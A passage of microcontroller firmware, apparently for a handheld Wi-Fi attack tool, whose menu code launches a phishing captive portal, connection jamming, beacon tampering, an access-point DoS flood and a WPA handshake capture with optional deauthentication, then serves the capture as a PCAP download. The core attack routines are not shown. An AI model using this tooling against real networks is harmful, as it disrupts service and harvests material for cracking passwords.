    u8g2_for_adafruit_gfx.setCursor(5, 60);
    u8g2_for_adafruit_gfx.print("《 Main Menu");
    display.display();
    while (digitalRead(BTN_BACK) != LOW) { delay(10); }
    while (digitalRead(BTN_BACK) == LOW) { delay(10); }
  } else {
    if (apWebPageSelectionMenu()) {
      // ，
      stabilizeButtonState();
      
      bool confirmed = showConfirmModal("Start Phishing");
      if (confirmed) {
        display.clearDisplay();
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        const char* msg = "Starting...";
        int w = u8g2_for_adafruit_gfx.getUTF8Width(msg);
        int x = (display.width() - w) / 2;
        u8g2_for_adafruit_gfx.setCursor(x, 32);
        u8g2_for_adafruit_gfx.print(msg);
        display.display();
        if (!startWebTest()) {
          showModalMessage("Start failed");
        }
      }
    }
  }
}

void homeActionConnInterfere() {
  // 
  if (SelectedVector.empty()) { 
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSID
    }
    return; 
  }
  // 
  if (showLinkJammerInfoPage()) {
    stabilizeButtonState();
    // 
    if (SelectedVector.size() > 1) {
      if (showConfirmModal("Select 1 target", "《 Back", "Continue 》")) {
        LinkJammer();
      }
    } else {
      if (showConfirmModal("Start CI")) {
        LinkJammer();
      }
    }
  }
}

void homeActionBeaconTamper() {
  // 
  if (SelectedVector.empty()) { 
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSID
    }
    return; 
  }
  // 
  if (showBeaconTamperInfoPage()) {
    // 
    if (showBeaconTamperWarningPage()) {
      stabilizeButtonState();
      // 
      if (SelectedVector.size() > 3) {
        if (showConfirmModal("Too many targets", "《 Back", "Continue 》")) {
          BeaconTamper();
        }
      } else {
        if (showConfirmModal("Start BBH")) {
          BeaconTamper();
        }
      }
    }
  }
}

void homeActionApFlood() {
  // （/ / AP）
  if (SelectedVector.empty()) { 
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSID
    }
    return; 
  }
  // AP；，
  if (showApFloodInfoPage()) {
    // ，
    stabilizeButtonState();
    // 
    if (SelectedVector.size() > 1) {
      if (showConfirmModal("Select 1 target", "《 Back", "Continue 》")) {
        RequestFlood();
      }
    } else {
      if (showConfirmModal("Start DoS")) {
        RequestFlood();
      }
    }
  }
}

void homeActionAttackDetect() {
  // 
  // ，
  stabilizeButtonState();
  if (showConfirmModal("Start Detect")) {
    drawAttackDetectPage();
  }
}

void homeActionPacketMonitor() {
  // 
  // ，
  stabilizeButtonState();
  if (showConfirmModal("Start Monitor")) {
    drawPacketDetectPage();
  }
}

void homeActionDeepScan() {
  // ，
  stabilizeButtonState();
  if (showConfirmModal("Start DeepScan")) {
    drawDeepScan();
  }
}

void homeActionWebUI() {
  // ，
  stabilizeButtonState();
  if (showConfirmModal("Start Web UI")) {
    startWebUI();
  }
}

void homeActionQuickCapture() {
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSID
    }
    return;
  }
  
  // 
  drawQuickCaptureModeSelection();
}

// 
void drawQuickCaptureModeSelection() {
  int modeState = 0; // 0=, 1=, 2=
  const char* modeNames[] = {"Active Mode", "Passive Mode", "Efficient Mode"};
  
  while (true) {
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    // - 
    const char* title = "Capture Mode";
    int titleWidth = u8g2_for_adafruit_gfx.getUTF8Width(title);
    int titleCenterX = (display.width() - titleWidth) / 2;
    if (titleCenterX < 0) titleCenterX = 0;
    u8g2_for_adafruit_gfx.setCursor(titleCenterX, 15);
    u8g2_for_adafruit_gfx.print(title);
    
    // 
    for (int i = 0; i < 3; i++) {
      int y = 25 + i * 14; // 
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      
      // - UTF8
      int textWidth = u8g2_for_adafruit_gfx.getUTF8Width(modeNames[i]);
      int centerX = (display.width() - textWidth) / 2;
      if (centerX < 0) centerX = 0;
      
      // ，
      if (i == modeState) {
        // 
        u8g2_for_adafruit_gfx.setCursor(centerX - 15, y + 8);
        u8g2_for_adafruit_gfx.print("-");
        
        // 
        u8g2_for_adafruit_gfx.setCursor(centerX + textWidth + 5, y + 8);
        u8g2_for_adafruit_gfx.print(" -");
      }
      
      // 
      u8g2_for_adafruit_gfx.setCursor(centerX, y + 8);
      u8g2_for_adafruit_gfx.print(modeNames[i]);
    }
    
    
    display.display();
    
    // - 
    static unsigned long lastKeyTime = 0;
    static bool keyPressed = false;
    
    if (digitalRead(BTN_UP) == LOW) {
      if (!keyPressed && millis() - lastKeyTime > 150) {
        keyPressed = true;
        lastKeyTime = millis();
        if (modeState > 0) modeState--;
      }
    } else if (digitalRead(BTN_DOWN) == LOW) {
      if (!keyPressed && millis() - lastKeyTime > 150) {
        keyPressed = true;
        lastKeyTime = millis();
        if (modeState < 2) modeState++;
      }
    } else if (digitalRead(BTN_OK) == LOW) {
      if (!keyPressed && millis() - lastKeyTime > 150) {
        keyPressed = true;
        lastKeyTime = millis();
        quick_capture_mode = modeState;
        startQuickCapture();
        return;
      }
    } else if (digitalRead(BTN_BACK) == LOW) {
      if (!keyPressed && millis() - lastKeyTime > 150) {
        keyPressed = true;
        lastKeyTime = millis();
        return;
      }
    } else {
      keyPressed = false;
    }
    
    delay(20); // 
  }
}

// 
void startQuickCapture() {
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSID
    }
    return;
  }
  
  // 
  int selectedIndex = SelectedVector[0];
  WiFiScanResult selected = scan_results[selectedIndex];
  memcpy(_selectedNetwork.bssid, selected.bssid, 6);
  _selectedNetwork.ssid = selected.ssid;
  _selectedNetwork.ch = selected.channel;
  AP_Channel = String(selected.channel);
  
  // 
  if (quick_capture_mode == 1) { // 
    g_captureMode = CAPTURE_MODE_PASSIVE;
    g_captureDeauthEnabled = false;
    Serial.println("[QuickCapture] Mode: PASSIVE");
  } else if (quick_capture_mode == 2) { // 
    g_captureMode = CAPTURE_MODE_EFFICIENT;
    g_captureDeauthEnabled = false;
    Serial.println("[QuickCapture] Mode: EFFICIENT");
  } else { // 
    g_captureMode = CAPTURE_MODE_ACTIVE;
    g_captureDeauthEnabled = true;
    Serial.println("[QuickCapture] Mode: ACTIVE");
  }
  
  Serial.print("[QuickCapture] Target: ");
  Serial.print(_selectedNetwork.ssid);
  Serial.print(" (");
  Serial.print(macToString(_selectedNetwork.bssid, 6));
  Serial.print(") CH");
  Serial.println(_selectedNetwork.ch);
  
  // 
  isHandshakeCaptured = false;
  handshakeDataAvailable = false;
  resetCaptureData();
  resetGlobalHandshakeData();
  
  // 
  quick_capture_active = true;
  quick_capture_completed = false;
  quick_capture_start_time = millis();
  readyToSniff = true;
  hs_sniffer_running = true;
  
  // 
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 30);
  u8g2_for_adafruit_gfx.print("Starting capture...");
  display.display();
  delay(1000);
}

// （）
void displayQuickCaptureProgress() {
  static unsigned long lastUpdate = 0;
  unsigned long currentTime = millis();
  
  // 500ms
  if (currentTime - lastUpdate > 500) {
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 15);
    u8g2_for_adafruit_gfx.print("Capturing...");
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("Target: ");
    String ssidDisplay = _selectedNetwork.ssid.length() > 8 ? _selectedNetwork.ssid.substring(0, 8) + "..." : _selectedNetwork.ssid;
    u8g2_for_adafruit_gfx.print(ssidDisplay);
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 35);
    u8g2_for_adafruit_gfx.print("HS: ");
    u8g2_for_adafruit_gfx.print(capturedHandshake.frameCount);
    u8g2_for_adafruit_gfx.print("/4");
    
    u8g2_for_adafruit_gfx.setCursor(5, 45);
    u8g2_for_adafruit_gfx.print("Mgmt: ");
    u8g2_for_adafruit_gfx.print(capturedManagement.frameCount);
    u8g2_for_adafruit_gfx.print("/10");
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 55);
    u8g2_for_adafruit_gfx.print("Time: ");
    u8g2_for_adafruit_gfx.print((currentTime - quick_capture_start_time) / 1000);
    u8g2_for_adafruit_gfx.print("s");
    
    display.display();
    lastUpdate = currentTime;
  }
}

// 
void drawQuickCaptureComplete() {
  int menuState = 0; // 0=Web, 1=
  
  while (true) {
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 15);
    u8g2_for_adafruit_gfx.print("Capture done!");
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("HS: ");
    u8g2_for_adafruit_gfx.print(capturedHandshake.frameCount);
    u8g2_for_adafruit_gfx.print("/4");
    
    u8g2_for_adafruit_gfx.setCursor(5, 35);
    u8g2_for_adafruit_gfx.print("Mgmt: ");
    u8g2_for_adafruit_gfx.print(capturedManagement.frameCount);
    u8g2_for_adafruit_gfx.print("/10");
    
    u8g2_for_adafruit_gfx.setCursor(5, 45);
    u8g2_for_adafruit_gfx.print("Time: ");
    u8g2_for_adafruit_gfx.print((quick_capture_end_time - quick_capture_start_time) / 1000);
    u8g2_for_adafruit_gfx.print("s");
    
    // 
    const char* menuItems[] = {"Start Web Svc", "Main Menu"};
    for (int i = 0; i < 2; i++) {
      int y = 55 + i * 12;
      if (i == menuState) {
        display.fillRoundRect(0, y-2, 128, 12, 2, SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
      } else {
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      }
      u8g2_for_adafruit_gfx.setCursor(5, y + 8);
      u8g2_for_adafruit_gfx.print(menuItems[i]);
    }
    
    display.display();
    
    // 
    if (digitalRead(BTN_UP) == LOW) {
      delay(200);
      if (menuState > 0) menuState--;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      if (menuState < 1) menuState++;
    }
    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      if (menuState == 0) {
        // Web
        startWebServiceForCapture();
        // Web
        drawWebServiceInfo();
        return;
      } else {
        // 
        return;
      }
    }
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      return;
    }
    delay(50);
  }
}

// 
void drawQuickCaptureTimeout() {
  while (true) {
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    u8g2_for_adafruit_gfx.setCursor(5, 20);
    u8g2_for_adafruit_gfx.print("Capture timeout");
    
    u8g2_for_adafruit_gfx.setCursor(5, 35);
    u8g2_for_adafruit_gfx.print("No full HS");
    
    u8g2_for_adafruit_gfx.setCursor(5, 50);
    u8g2_for_adafruit_gfx.print("《 Main Menu");
    
    display.display();
    
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      return;
    }
    delay(50);
  }
}

// Web
void startWebServiceForCapture() {
  Serial.println("=== Start Capture Web ===");
  
  // 
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();
  
  // 
  delay(2000);
  
  // AP
  Serial.println("Start capture AP...");
  char channel_str[4];
  sprintf(channel_str, "%d", WEB_UI_CHANNEL);
  
  // 
  int retryCount = 0;
  bool apStarted = false;
  while (retryCount < 3 && !apStarted) {
    if (WiFi.apbegin(WEB_UI_SSID, WEB_UI_PASSWORD, channel_str, 0)) {
      apStarted = true;
      Serial.println("Capture AP OK");
    } else {
      retryCount++;
      Serial.print("Capture AP fail, retry ");
      Serial.print(retryCount);
      Serial.println("/3");
      delay(1000);
    }
  }
  
  if (apStarted) {
    Serial.println("SSID: " + String(WEB_UI_SSID));
    Serial.println("Pass: " + String(WEB_UI_PASSWORD));
    Serial.println("CH: " + String(WEB_UI_CHANNEL));
    
    // AP
    delay(2000);
    
    IPAddress apIp = WiFi.localIP();
    Serial.print("IP: ");
    Serial.println(apIp);
    
    // Web
    startWebUIServices(apIp);
    
    Serial.println("Capture web started");
  } else {
    Serial.println("Capture AP fail after 3 retries");
  }
}

// 
void sendQuickCapturePage(WiFiClient& client) {
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta charset='UTF-8'>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>Capture Done</title>";
  html += "<style>";
  html += "body{font-family:Arial,sans-serif;margin:0;padding:20px;background:#f5f5f5;}";
  html += ".container{max-width:600px;margin:0 auto;background:white;padding:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}";
  html += "h1{color:#333;text-align:center;margin-bottom:30px;}";
  html += ".status{background:#e8f5e8;border:1px solid #4caf50;padding:15px;border-radius:5px;margin:20px 0;}";
  html += ".info{background:#f0f8ff;border:1px solid #2196f3;padding:15px;border-radius:5px;margin:20px 0;}";
  html += ".btn{display:inline-block;padding:12px 24px;background:#4caf50;color:white;text-decoration:none;border-radius:5px;margin:10px 5px;text-align:center;}";
  html += ".btn:hover{background:#45a049;}";
  html += ".btn-danger{background:#f44336;}";
  html += ".btn-danger:hover{background:#da190b;}";
  html += ".stats{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:20px 0;}";
  html += ".stat-item{background:#f9f9f9;padding:15px;border-radius:5px;text-align:center;}";
  html += ".stat-value{font-size:24px;font-weight:bold;color:#2196f3;}";
  html += ".stat-label{color:#666;margin-top:5px;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<h1>🔐 Capture Done</h1>";
  
  // 
  html += "<div class='status'>";
  html += "<h3>Capture Stats</h3>";
  html += "<div class='stats'>";
  html += "<div class='stat-item'><div class='stat-value'>" + String(capturedHandshake.frameCount) + "/4</div><div class='stat-label'>HS Frames</div></div>";
  html += "<div class='stat-item'><div class='stat-value'>" + String(capturedManagement.frameCount) + "/10</div><div class='stat-label'>Mgmt Frames</div></div>";
  html += "<div class='stat-item'><div class='stat-value'>" + String((quick_capture_end_time - quick_capture_start_time) / 1000) + "s</div><div class='stat-label'>Time</div></div>";
  html += "<div class='stat-item'><div class='stat-value'>" + String(globalPcapData.size()) + "B</div><div class='stat-label'>File Size</div></div>";
  html += "</div></div>";
  
  // 
  html += "<div class='info'>";
  html += "<h3>Target Network</h3>";
  html += "<p><strong>SSID:</strong> " + _selectedNetwork.ssid + "</p>";
  html += "<p><strong>BSSID:</strong> " + macToString(_selectedNetwork.bssid, 6) + "</p>";
  html += "<p><strong>Channel:</strong> " + String(_selectedNetwork.ch) + "</p>";
  html += "<p><strong>Mode:</strong> ";
  if (quick_capture_mode == 0) html += "Active Mode";
  else if (quick_capture_mode == 1) html += "Passive Mode";
  else html += "Efficient Mode";
  html += "</p></div>";
  
  // 
  html += "<div style='text-align:center;margin:30px 0;'>";
  html += "<a href='/capture/download' class='btn'>📥 Download PCAP</a>";
  html += "<a href='/' class='btn btn-danger'>🏠 Home</a>";
  html += "</div>";
  
  html += "<div style='text-align:center;color:#666;font-size:14px;'>";
  html += "<p>⚠️ For security research & education only</p>";
  html += "</div></div></body></html>";
  
  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: text/html; charset=UTF-8\r\n";
  header += "Content-Length: " + String(html.length()) + "\r\n";
  header += "Connection: close\r\n\r\n";
  client.print(header);
  client.print(html);
}

// PCAP
void sendPcapDownload(WiFiClient& client) {
  if (globalPcapData.empty()) {
    String hdr = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n";
    client.print(hdr);
    return;
  }
  
  String hdr = "HTTP/1.1 200 OK\r\n";
  hdr += "Content-Type: application/octet-stream\r\n";
  hdr += "Content-Disposition: attachment; filename=\"handshake_" + _selectedNetwork.ssid + ".pcap\"\r\n";
  hdr += "Content-Length: " + String(globalPcapData.size()) + "\r\n";
  hdr += "Connection: close\r\n\r\n";
  client.print(hdr);
  client.write(globalPcapData.data(), globalPcapData.size());
}

// API
void sendCaptureStatus(WiFiClient& client) {
  String json = "{";
  json += "\"completed\":" + String(quick_capture_completed ? "true" : "false") + ",";
  json += "\"handshake_frames\":" + String(capturedHandshake.frameCount) + ",";
  json += "\"management_frames\":" + String(capturedManagement.frameCount) + ",";
  json += "\"capture_time\":" + String((quick_capture_end_time - quick_capture_start_time) / 1000) + ",";
  json += "\"file_size\":" + String(globalPcapData.size()) + ",";
  json += "\"target_ssid\":\"" + _selectedNetwork.ssid + "\",";
  json += "\"target_bssid\":\"" + macToString(_selectedNetwork.bssid, 6) + "\",";
  json += "\"target_channel\":" + String(_selectedNetwork.ch) + ",";
  json += "\"capture_mode\":" + String(quick_capture_mode);
  json += "}";
  
  String hdr = "HTTP/1.1 200 OK\r\n";
  hdr += "Content-Type: application/json\r\n";
  hdr += "Content-Length: " + String(json.length()) + "\r\n";
  hdr += "Connection: close\r\n\r\n";
  client.print(hdr);
  client.print(json);
}

// Web
void drawWebServiceInfo() {
  while (true) {
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 18);
    u8g2_for_adafruit_gfx.print("Handshake got");
    
    // 
    u8g2_for_adafruit_gfx.setCursor(5, 30);
    u8g2_for_adafruit_gfx.print("Next: start Web");
    
    u8g2_for_adafruit_gfx.setCursor(5, 42);
    u8g2_for_adafruit_gfx.print("to download HS");
    
    u8g2_for_adafruit_gfx.setCursor(5, 54);
    u8g2_for_adafruit_gfx.print("《 Cont | DL");
    
    display.display();
    
    // 
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      return;
    }
    delay(50);
  }
}

// Web
void displayWebServiceStatus() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 
  u8g2_for_adafruit_gfx.setCursor(5, 15);
  u8g2_for_adafruit_gfx.print("Web service up");
  
  // 
  u8g2_for_adafruit_gfx.setCursor(5, 25);
  u8g2_for_adafruit_gfx.print("Target: ");
  String ssidDisplay = _selectedNetwork.ssid.length() > 8 ? _selectedNetwork.ssid.substring(0, 8) + "..." : _selectedNetwork.ssid;
  u8g2_for_adafruit_gfx.print(ssidDisplay);
  
  // 
  u8g2_for_adafruit_gfx.setCursor(5, 35);
  u8g2_for_adafruit_gfx.print("HS: ");
  u8g2_for_adafruit_gfx.print(capturedHandshake.frameCount);
  u8g2_for_adafruit_gfx.print("/4");
  
  u8g2_for_adafruit_gfx.setCursor(5, 45);
  u8g2_for_adafruit_gfx.print("Mgmt: ");
  u8g2_for_adafruit_gfx.print(capturedManagement.frameCount);
  u8g2_for_adafruit_gfx.print("/10");
  
  // Web
  u8g2_for_adafruit_gfx.setCursor(5, 55);
  u8g2_for_adafruit_gfx.print("Web: 192.168.1.1");
  
  display.display();
}

